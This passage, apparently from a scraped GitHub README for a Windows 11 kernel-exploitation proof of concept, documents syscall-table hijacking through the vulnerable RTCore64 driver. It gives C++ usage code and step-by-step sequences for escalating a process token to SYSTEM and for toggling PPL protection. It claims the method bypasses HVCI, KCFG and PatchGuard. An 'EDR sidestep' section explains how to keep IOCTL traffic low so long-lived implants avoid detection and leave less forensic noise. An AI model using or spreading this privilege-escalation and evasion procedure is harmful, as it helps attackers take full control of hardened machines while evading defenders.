+│      • calls routine(RCX, RDX, R8, R9, [rsp+0x28]…)                     │
+│                                                                         │
+│  The hijacked routine sees:                                             │
+│      RCX = a, RDX = b, R8 = c, R9 = arg4,                               │
+│      [rsp+0x28]+ = whatever stack args the caller staged                │
+│  — identical to a direct kernel call. No fix-ups needed.                │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">Three things to take away from that flow:</p>
+<ol dir="auto">
+<li><strong>The asm stub is arity-agnostic.</strong> Same 4 instructions whether you're calling a 2-arg routine or an 8-arg one. The compiler on the C++ side stages everything correctly because you cast to the matching <code>PFN_HSC_N</code> typedef.</li>
+<li><strong><code>stackArgs</code> in the table entry is what makes &gt;4-arg calls work.</strong> Forget to set it and the kernel won't copy your <code>[rsp+0x28]+</code> data over — the hijacked routine reads garbage for args 5+ and BSODs (or worse, silently misbehaves).</li>
+<li><strong>Arg 1 surviving the SYSCALL relies on R10.</strong> That's the whole reason for <code>mov r10, rcx</code> — the SYSCALL instruction overwrites RCX with the return address, so the kernel-side handler restores RCX from R10 before invoking the target routine.</li>
+</ol>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">Putting it together</h4><a id="user-content-putting-it-together" class="anchor" aria-label="Permalink: Putting it together" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#putting-it-together"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<div class="highlight highlight-source-c++ notranslate position-relative overflow-auto" dir="auto"><pre>helper.prepareHijack();                                  <span class="pl-c"><span class="pl-c">//</span> flip PDE R/W, save state</span>
+helper.pointSyscallTo(target_kernel_addr, <span class="pl-c"><span class="pl-c">/*</span>stackArgs<span class="pl-c">*/</span></span><span class="pl-c1">0</span>);
+<span class="pl-c1">NTSTATUS</span> s = ((<span class="pl-c1">PFN_HSC_3</span>)HijackedSyscall)(a, b, c);      <span class="pl-c"><span class="pl-c">//</span> 3 args, all in regs</span>
+
+helper.pointSyscallTo(other_kernel_addr, <span class="pl-c"><span class="pl-c">/*</span>stackArgs<span class="pl-c">*/</span></span><span class="pl-c1">3</span>); <span class="pl-c"><span class="pl-c">//</span> redirect to a 7-arg API</span>
+<span class="pl-c1">NTSTATUS</span> s2 = ((<span class="pl-c1">PFN_HSC_7</span>)HijackedSyscall)(a,b,c,d,e,f,g);
+
+helper.restoreHijack();                                  <span class="pl-c"><span class="pl-c">//</span> restore entry + PDE</span></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="helper.prepareHijack();                                  // flip PDE R/W, save state
+helper.pointSyscallTo(target_kernel_addr, /*stackArgs*/0);
+NTSTATUS s = ((PFN_HSC_3)HijackedSyscall)(a, b, c);      // 3 args, all in regs
+
+helper.pointSyscallTo(other_kernel_addr, /*stackArgs*/3); // redirect to a 7-arg API
+NTSTATUS s2 = ((PFN_HSC_7)HijackedSyscall)(a,b,c,d,e,f,g);
+
+helper.restoreHijack();                                  // restore entry + PDE" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">The <code>PFN_HSC_2</code> … <code>PFN_HSC_8</code> typedefs live in <code>kernelHelperUtil.h</code>; cast <code>HijackedSyscall</code> to the one that matches the routine's arity. The same syscall slot can be repointed any number of times between <code>prepareHijack()</code> and <code>restoreHijack()</code> — that's exactly how <code>/privesc</code> chains two different routines through one hijack window.</p>
+<hr>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">🔓 Privesc demo — <code>/privesc &lt;PID&gt;</code></h3><a id="user-content--privesc-demo--privesc-pid" class="anchor" aria-label="Permalink: 🔓 Privesc demo — /privesc <PID>" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#-privesc-demo--privesc-pid"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto"><code>bool kernelHelper::privesc(DWORD32 pid)</code> chains two hijacks to elevate the target process's primary token to SYSTEM:</p>
+<ol dir="auto">
+<li><strong><code>prepareHijack()</code></strong> — flip the PDE R/W bit, snapshot the original entry.</li>
+<li><strong>Hijack #1</strong> → <code>PsLookupProcessByProcessId</code>. Called twice in the same hijack window:
+<ul dir="auto">
+<li>once for the target PID → returns target <code>EPROCESS</code>,</li>
+<li>once for PID 4 (System) → returns SYSTEM <code>EPROCESS</code>.</li>
+</ul>
+</li>
+<li>Read both <code>EPROCESS.Token</code> (EX_FAST_REF) values through the existing R/W primitive. Compute <code>newToken = (system &amp; ~0xF) | (target &amp; 0xF)</code> — keep the target's cached ref count, take SYSTEM's pointer bits.</li>
+<li><strong>Hijack #2</strong> → <code>nt!memcpy</code>. The same syscall slot is now redirected to a 3-arg API. Call it as <code>memcpy((PVOID)(targetEPROC + Token), &amp;newToken, sizeof(DWORD64))</code> — the actual token write happens <strong>in kernel mode</strong>, not via the RTCore64 R/W primitive.</li>
+<li><strong><code>restoreHijack()</code></strong> — restore the original entry + PDE flags.</li>
+</ol>
+<p dir="auto">After this returns, any new process spawned by the target PID (or the next time a privileged check is made against it) runs as SYSTEM.</p>
+<blockquote>
+<p dir="auto"><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> The EPROCESS refs taken by <code>PsLookupProcessByProcessId</code> are intentionally not released in this PoC (the routine returns a referenced object). For a long-lived implant you'd want to call <code>ObfDereferenceObject</code> (also via a hijack) to balance the refcount.</p>
+</blockquote>
+<hr>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">🛡️ PPL toggle — <code>/ppl &lt;PID&gt; &lt;0|1&gt;</code></h3><a id="user-content-️-ppl-toggle--ppl-pid-01" class="anchor" aria-label="Permalink: 🛡️ PPL toggle — /ppl <PID> <0|1>" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#%EF%B8%8F-ppl-toggle--ppl-pid-01"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto"><code>bool kernelHelper::pplToggle(DWORD32 pid, BOOL makeProtected)</code> reuses the same two-hijack pattern as <code>/privesc</code>, but writes a <strong>single byte</strong> instead of a token pointer. The byte sits at <code>_EPROCESS.Protection</code> (offset = <code>protectionOffset</code> in <code>offsets.h</code>):</p>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>_PS_PROTECTION  (1 byte total)
+┌────────────┬──────┬───────────────────┐
+│  Signer    │ Aud  │      Type         │
+│  bits 4..7 │ bit3 │   bits 0..2       │
+└────────────┴──────┴───────────────────┘
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="_PS_PROTECTION  (1 byte total)
+┌────────────┬──────┬───────────────────┐
+│  Signer    │ Aud  │      Type         │
+│  bits 4..7 │ bit3 │   bits 0..2       │
+└────────────┴──────┴───────────────────┘" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Values</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Type</code></td>
+<td>0 = None · 1 = ProtectedLight (PPL) · 2 = Protected (PP)</td>
+</tr>
+<tr>
+<td><code>Signer</code></td>
+<td>0 = None · 1 = Authenticode · 4 = Windows · 6 = WinTcb · 7 = WinSystem · ...</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto">The CLI maps:</p>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th><code>/ppl &lt;PID&gt; X</code></th>
+<th>Written byte</th>
+<th>Decoded</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>0</code></td>
+<td><code>0x00</code></td>
+<td>unprotected</td>
+</tr>
+<tr>
+<td><code>1</code></td>
+<td><code>0x61</code></td>
+<td>Type = ProtectedLight, Signer = WinTcb  (same as LSASS)</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto">Sequence:</p>
+<ol dir="auto">
+<li><strong><code>prepareHijack()</code></strong> — flip the PDE R/W bit, snapshot the original entry.</li>
+<li><strong>Hijack #1</strong> → <code>PsLookupProcessByProcessId(pid, &amp;out)</code> to fetch the target's <code>EPROCESS</code>.</li>
+<li><strong>Read</strong> the current Protection byte via the R/W primitive (display-only — lets you see the before-state).</li>
+<li><strong>Hijack #2</strong> → <code>memcpy(targetEPROC + Protection, &amp;newByte, 1)</code> — kernel-mode 1-byte write that flips <code>_PS_PROTECTION</code>.</li>
+<li><strong>Verify</strong> by re-reading via the R/W primitive.</li>
+<li><strong><code>restoreHijack()</code></strong> — restore the original entry + PDE flags.</li>
+</ol>
+<p dir="auto">The same caveats as <code>/privesc</code> apply (<code>memcpy</code> must resolve, the EPROCESS lookup leaks a ref). One extra: <strong>on modern kernels, setting PPL via only the Protection byte isn't always sufficient</strong> — <code>SignatureLevel</code> and <code>SectionSignatureLevel</code> (single-byte fields adjacent to Protection) may also be checked by certain code paths (e.g., DLL-loading enforcement). For full LSASS-style PPL, patch those too. The <code>/ppl</code> demo intentionally writes only one byte so the technique stays minimal and obvious.</p>
+<hr>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">🔐 Security Bypass Summary</h3><a id="user-content--security-bypass-summary" class="anchor" aria-label="Permalink: 🔐 Security Bypass Summary" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#-security-bypass-summary"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">This technique effectively bypasses multiple modern kernel security mechanisms:</p>
+<p dir="auto"><strong>KCFG (Kernel Control Flow Guard):</strong> this technique will not trigger KCFG as it is a syscall dispatcher that doesn't trigger KCFG.</p>
+<p dir="auto"><strong>KCET (Kernel Code Execution Prevention):</strong> No KCET violations, as we are not overwriting any return addresses in the stack.</p>
+<p dir="auto"><strong>W^X Policies:</strong> We never write to executable memory directly — memory remains either writable or executable, but not both.</p>
+<p dir="auto"><strong>Hypervisor-based protections &amp; VBS:</strong> Hijacking the syscall doesn't violate HVCI because it's only read write bit we are changing or modifying in the page tables. hyperv will trust the kernel with these changes. the normal page tables will not be verified by the EPT if you change something from read to write or write to read :) =&gt; it's by design.</p>
+<blockquote>
+<p dir="auto">Every demo in this repo (<code>/codeexecution</code>, <code>/privesc</code>, <code>/ppl</code>) only calls code that already lives in <code>ntoskrnl.exe</code>'s <code>.text</code>, which HVCI keeps RX-locked in EPT — so HVCI's W^X enforcement never has anything to object to. Combined with the data-only PDE flip above, that's why the technique works end-to-end on a fully VBS-hardened Win11 box.</p>
+</blockquote>
+<p dir="auto"><strong>PatchGuard:</strong> PatchGuard watches for modifications to critical structures. However, since this hijack is temporary and fully restored shortly after execution, it significantly lowers the risk of PatchGuard triggering a bug check.</p>
+<p dir="auto"><strong>And It doesn't seems PatchGuard checks that entry at all as I left it modified for an hour and no BSOD.</strong></p>
+<hr>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">🕵️ EDR sidestep — using the hijack itself as the kernel R/W primitive</h3><a id="user-content-️-edr-sidestep--using-the-hijack-itself-as-the-kernel-rw-primitive" class="anchor" aria-label="Permalink: 🕵️ EDR sidestep — using the hijack itself as the kernel R/W primitive" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#%EF%B8%8F-edr-sidestep--using-the-hijack-itself-as-the-kernel-rw-primitive"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">The most common BYOVD detection signal isn't the <em>technique</em> — it's the <strong>volume of IOCTLs the vulnerable driver receives</strong>. RTCore64 in particular has well-known IOCTL signatures; an EDR that sees the same process pinging it dozens of times per second has a reliable IOC even without ever inspecting <em>what's</em> being read.</p>
+<p dir="auto">This technique gives you a way to <strong>collapse that pattern to a single setup burst</strong>. Once the hijack slot is established, you don't need to keep talking to RTCore64 — the hijack itself becomes your kernel R/W primitive:</p>
+<ul dir="auto">
+<li><strong>Kernel writes:</strong> point the slot at <code>nt!memcpy(dest, src, len)</code> and write from a user buffer into kernel memory. That's exactly how <code>/privesc</code> and <code>/ppl</code> already work — the token swap and the <code>_EPROCESS.Protection</code> flip both happen <strong>through the hijack</strong>, not back through RTCore64.</li>
+<li><strong>Kernel reads:</strong> same trick — point the slot at <code>nt!memcpy(user_buf, kernel_src, len)</code> (or any read accessor with a similar shape) and the data lands in user space without an RTCore64 IOCTL.</li>
+</ul>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">The threat-model shift, visually</h4><a id="user-content-the-threat-model-shift-visually" class="anchor" aria-label="Permalink: The threat-model shift, visually" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#the-threat-model-shift-visually"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>                       RTCore64 IOCTLs over time  →
+Naive BYOVD chain      █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █
+                       ▲                                             ▲
+                       setup                                 every R/W call
+                                (sustained — easy to alert on the rate)
+
+Bootstrap-then-quiet   █ █ █ █ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░
+                       ▲       └──────── NtSetQuotaInformationFile ────┘
+                       setup   syscalls — indistinguishable from normal
+                               process syscall traffic
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="                       RTCore64 IOCTLs over time  →
+Naive BYOVD chain      █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █
+                       ▲                                             ▲
+                       setup                                 every R/W call
+                                (sustained — easy to alert on the rate)
+
+Bootstrap-then-quiet   █ █ █ █ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░
+                       ▲       └──────── NtSetQuotaInformationFile ────┘
+                       setup   syscalls — indistinguishable from normal
+                               process syscall traffic" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">Honest scope — what this does and doesn't hide</h4><a id="user-content-honest-scope--what-this-does-and-doesnt-hide" class="anchor" aria-label="Permalink: Honest scope — what this does and doesn't hide" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#honest-scope--what-this-does-and-doesnt-hide"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">RTCore64 still has to surface during <strong>initial setup</strong>. Specifically, the IOCTLs needed before the hijack is live:</p>
+<ol dir="auto">
+<li>Read <code>KeServiceDescriptorTableShadow</code> → resolve <code>KiServiceTable</code> address.</li>
+<li>Read the original <code>KiServiceTable[NtSetQuotaInformationFile]</code> entry (so we can restore it later).</li>
+<li>Read the PDE covering the table page.</li>
+<li>Write the PDE with the R/W bit flipped.</li>
+<li>Write the new <code>KiServiceTable</code> entry pointing at the first target routine.</li>
+</ol>
+<p dir="auto">That's the bootstrap burst. After step 5, every subsequent kernel R/W can go through the hijack — no more RTCore64 traffic until cleanup (and even cleanup can in principle be routed through the hijack, leaving only the final PDE-restore write).</p>
+<p dir="auto">So the vulnerable driver is <strong>never invisible</strong> — it's visible for a short, bounded setup burst and then goes quiet. An EDR that already alerts on RTCore64 <em>loading</em>, or on the very first IOCTL, still catches the bootstrap. What this defeats is the <strong>sustained IOCTL pattern</strong> that long-lived implants would otherwise generate.</p>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">Where this is useful</h4><a id="user-content-where-this-is-useful" class="anchor" aria-label="Permalink: Where this is useful" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#where-this-is-useful"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<ul dir="auto">
+<li><strong>Long-lived implants</strong> that need ongoing kernel R/W (token swaps on freshly spawned processes, periodic callback unhooks, on-demand object hides). After the one-time bootstrap, every subsequent R/W shows up as <code>NtSetQuotaInformationFile</code> syscall traffic.</li>
+<li><strong>Heuristic IOCTL-rate detections.</strong> Many EDRs key on the <em>rate</em> of suspicious IOCTLs to a known-vulnerable driver more than on the first one. Collapsing steady-state traffic to a single setup burst sidesteps that class of heuristic.</li>
+<li><strong>Reducing forensic noise.</strong> ETW providers that log driver IRPs see one short burst instead of a continuous stream correlated 1:1 with the implant's kernel operations.</li>
